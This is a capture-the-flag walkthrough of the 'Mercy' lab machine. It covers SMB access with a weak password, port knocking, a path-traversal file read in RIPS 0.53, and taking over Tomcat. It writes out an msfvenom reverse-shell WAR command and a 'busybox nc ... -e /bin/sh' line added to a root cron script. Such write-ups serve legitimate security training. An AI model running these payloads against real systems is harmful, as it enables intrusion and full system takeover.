initial recon

PORT     STATE SERVICE      REASON\
53/tcp   open  domain       syn-ack ttl 64\
110/tcp  open  pop3         syn-ack ttl 64\
139/tcp  open  netbios-ssn  syn-ack ttl 64\
143/tcp  open  imap         syn-ack ttl 64\
445/tcp  open  microsoft-ds syn-ack ttl 64\
993/tcp  open  imaps        syn-ack ttl 64\
995/tcp  open  pop3s        syn-ack ttl 64\
8080/tcp open  http-proxy   syn-ack ttl 64\

lets fire up burpsuite and access port 8080\
<img width="1692" height="439" alt="image" src="https://github.com/user-attachments/assets/1a0b4ddb-442e-4eda-9760-774d617cc1ce" />

after finding /robots.txt
it has /tryharder/tryharder as an endpoint
which gives us this base64 encoded string "SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg=="

after decoding we get 
"It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.

Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.

No fluffy bunnies for those who set insecure passwords and endanger the enterprise."

So its safe to assume that somewhere some user has the password "password"

both /manager/html and /host-manager/html were unaccessible with 401
i tried some bruteforcing , but no result

we see that smb is open on the target machine
so we use smbmap -H 192.168.1.9

<img width="982" height="349" alt="image" src="https://github.com/user-attachments/assets/78c32a1f-b2a6-4d2f-a8db-6a8b078c3ad9" />\

it lists a custom share qiu
lets try to login with user qiu 
smbclient //192.168.1.9/qiu -U qiu
here we used the password "password"
we see some files here , i download .bash_history onto my machine\
<img width="152" height="306" alt="image" src="https://github.com/user-attachments/assets/7002fb01-307f-4f1e-bd36-001016c4a640" />\
i see that there is a user "qiu" on the machine , some stuff going on with .private and secrets

so i enumerate and get some files\
<img width="113" height="108" alt="image" src="https://github.com/user-attachments/assets/b94c20b7-56c3-430d-af38-6cabcec3c5b6" />\
i go through the files
but i check configprint\
<img width="703" height="310" alt="image" src="https://github.com/user-attachments/assets/6174a69b-b7f5-464c-a94a-eb7011e59ae0" />\
i see that a lot of configurations have been appended to config file

so when i check that
we can see that when we knock specific ports on the machine , it does some actions like opening/closing of http and ssh\
<img width="669" height="467" alt="image" src="https://github.com/user-attachments/assets/7e7f9a1a-f8ce-4330-ae50-280eb364777b" />\

after knocking the ports \
knock 192.168.1.9 159 27391 4 -v

we can see that port 80 is open when accessed we get\
<img width="493" height="99" alt="image" src="https://github.com/user-attachments/assets/b496ef44-52c3-4940-8f5e-b8d33a73c0f5" />\

after running dirb on port 80
we get /time
which just shows current time\
<img width="397" height="53" alt="image" src="https://github.com/user-attachments/assets/dea11ead-c3c0-4d6d-a419-8fb66174fd50" />\
nothing much to do here

after some enumeration we can see that 2 paths are mentioned in the robots.txt file\
Disallow: /mercy\
Disallow: /nomercy

accessing /mercy gives us\
<img width="395" height="255" alt="image" src="https://github.com/user-attachments/assets/908127fa-6358-4b01-adeb-680eef744927" />\
when we acces index it gives
"Welcome to Mercy!

We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system."
not much to do here agin

so lets access /nomercy\
<img width="1705" height="789" alt="image" src="https://github.com/user-attachments/assets/f7041824-ff42-41f9-8be2-a8cc502857fe" />\
we see a RIPS v0.53
after checking searchsploit 
we see that this ver has an lfi vuln\
<img width="659" height="428" alt="image" src="https://github.com/user-attachments/assets/7dc32afc-f023-446f-b500-119b9ac6e7a1" />\

so accessing http://192.168.1.9/nomercy/windows/code.php?file=../../../../../../etc/passwd
successfully gives us the contents of /etc/passwd

from the home page of port 8080 we know that the users is located at /etc/tomcat7/tomcat-users.xml
so after accessing

we get 
<? <role rolename="admin-gui"/>\
<? <role rolename="manager-gui"/>\
<? <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>\
<? <user username="fluffy" password="freakishfluffybunny" roles="none"/>\

so we login with thisisasuperduperlonguser:heartbreakisinevitable at /manager/html\
which leads us to home page of apache tomcat where we can deploy a WAR file to get a reverse shell \
we can generate the WAR file using msfvenom\
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f war > backdoor.war\

you can see a /backdoor in the home page
click on it ,and you will get a reverse shell
i am using penelope for listening (since it auto upgrades into a stable shell)

<img width="837" height="187" alt="image" src="https://github.com/user-attachments/assets/2551c2a6-b6e8-43f9-be43-391b39fc7598" />\

after enumerating a bit , we login as qiu , using the creds  qiu:password 

after some enum , we find a local.txt file at root
<img width="252" height="34" alt="image" src="https://github.com/user-attachments/assets/5107f3f1-cd07-4506-bee0-1eef4e3a1dec" />\

then i realise , we can change to user fluffy with fluffy:freakishfluffybunny

after enumerating , we find a file timeclock
<img width="587" height="115" alt="image" src="https://github.com/user-attachments/assets/d25a9781-b975-48f9-9ae3-6d38091da7a3" />\
it is owned by root
and when i checked it was updating it every 3 mins , which means , the script was bring run every 3 minutes 
<img width="410" height="97" alt="image" src="https://github.com/user-attachments/assets/b2cf854b-0b76-448a-98b9-e9956f70fa96" />\

since we have write permissions , we can add another line to give us a reverse shell
after adding this line "busybox nc 192.168.1.10 4444 -e /bin/sh" 
we now have to setup a listener and wait to get a reverse shell
and as we see we get a root shell
<img width="864" height="194" alt="image" src="https://github.com/user-attachments/assets/1bc1f946-4d3d-4a36-a976-4f86ccde1555" />\

<img width="1701" height="556" alt="image" src="https://github.com/user-attachments/assets/4a022245-2132-444c-8f38-a0bfc1bf7133" />\
The End
Thank You for reading till the end 
